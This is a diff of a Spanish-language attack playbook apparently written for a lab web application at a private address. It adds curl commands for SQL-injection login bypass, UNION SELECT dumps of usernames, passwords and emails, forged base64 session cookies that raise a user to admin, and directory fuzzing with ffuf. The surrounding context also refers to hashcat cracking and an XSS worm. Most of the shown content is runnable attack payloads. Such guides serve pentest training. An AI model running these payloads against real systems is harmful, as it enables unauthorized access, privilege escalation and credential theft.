@@ -23,9 +23,11 @@ PAYLOAD 1 — Bypass de autenticación (OR clásico):
           El comentario -- elimina la verificación de contraseña.
   Resultado: Login como el primer usuario de la tabla.
 
-Ejemplo de ejecución manual con curl (Fase de Entrega):
-  curl -X POST http://192.168.56.20:4000/api/login -H "Content-Type: application/json" \
-  -d '{"username": "admin''' UNION SELECT 1, sql, 3 FROM sqlite_master --", "password": "123"}'
+  Ejemplo (curl):
+  curl -X POST http://192.168.56.20:4000/api/login \
+       -H "Content-Type: application/json" \
+       -d '{"username": "'' OR ''1''=''1''--", "password": "x"}'
+
 PAYLOAD 2 — UNION SELECT para enumerar columnas:
   username = ' UNION SELECT 1,2,3,4,5--
   Efecto: Confirma que la tabla users tiene 5 columnas.
@@ -48,6 +50,12 @@ PAYLOAD 5 — Exfiltración completa de la tabla users:
 
 PAYLOAD 6 — Extraer solo admin:
   query = ' UNION SELECT username,password,role FROM users WHERE role='admin'--
+
+  Ejemplo (curl):
+  curl -X POST http://192.168.56.20:4000/api/search \
+       -H "Content-Type: application/json" \
+       -H "Cookie: session=<COOKIE_AQUI>" \
+       -d '{"query": "'' UNION SELECT username,password,email FROM users--"}'
 
 ── ENDPOINT: GET /api/users/:id ────────────────────────────────────────────────
 Query vulnerable:
@@ -103,23 +111,24 @@ PAYLOAD 10 — XSS Worm autorreplicante (completo):
 PASO 1 — Cookie legítima recibida tras login:
   Set-Cookie: session=eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9; Path=/
 
-PASO 2 — Decodificar Base64 (CyberChef: From Base64):
+PASO 2 — Decodificar Base64 (CyberChef: From Base64 o atob() en navegador):
   eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9
   → {"userId":2,"username":"alice","role":"user"}
 
-PASO 3 — Manipular JSON (CyberChef: editar campo):
-  Cambiar: "userId":2
-  Por    : "userId":1
-  JSON adulterado: {"userId":1,"username":"alice","role":"user"}
+PASO 3 — Manipular JSON (CyberChef: editar campo para suplantar sesión):
+  Cambiar: "userId":2, "role":"user"
+  Por    : "userId":1, "role":"admin"
+  JSON adulterado: {"userId":1,"username":"alice","role":"admin"}
 
-PASO 4 — Re-codificar en Base64 (CyberChef: To Base64):
-  eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9
+PASO 4 — Re-codificar en Base64 (CyberChef: To Base64 o btoa()):
+  eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ==
 
 PASO 5 — Inyectar cookie en cabecera HTTP (Burp Suite / curl):
   curl http://192.168.56.20:4000/api/profile \
-       -H "Cookie: session=eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9"
+       -H "Cookie: session=eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ=="
 
-  Efecto: El servidor confía en userId=1 → Otorga acceso a la sesión del usuario con ID 1 (Secuestro de sesión).
+  Efecto: El servidor no verifica la integridad (CWE-345) y confía en los datos.
+  Permite extraer la información sensible del usuario suplantado (CWE-311).
 
 ================================================================================
  ID-2: FALLAS CRIPTOGRÁFICAS — MD5 sin salt (CWE-327/759/916)
@@ -138,8 +147,14 @@ Comando Hashcat en Kali Linux:
   Sin salt → determinista → rainbow tables funcionan directamente.
 
 ================================================================================
- FASE I: RECONOCIMIENTO — Interacción manual
+ FASE I: RECONOCIMIENTO — Comando ffuf
 ================================================================================
+
+En Kali Linux (alternativa al script Python):
+  ffuf -u http://192.168.56.20:4000/FUZZ \
+       -w /usr/share/wordlists/dirb/common.txt \
+       -mc 200,401,403,405 \
+       -t 10
 
 Descubrimiento manual de cabeceras:
   curl -v http://192.168.56.20:4000/api/login 2>&1 | grep -E "X-Powered-By|Set-Cookie"
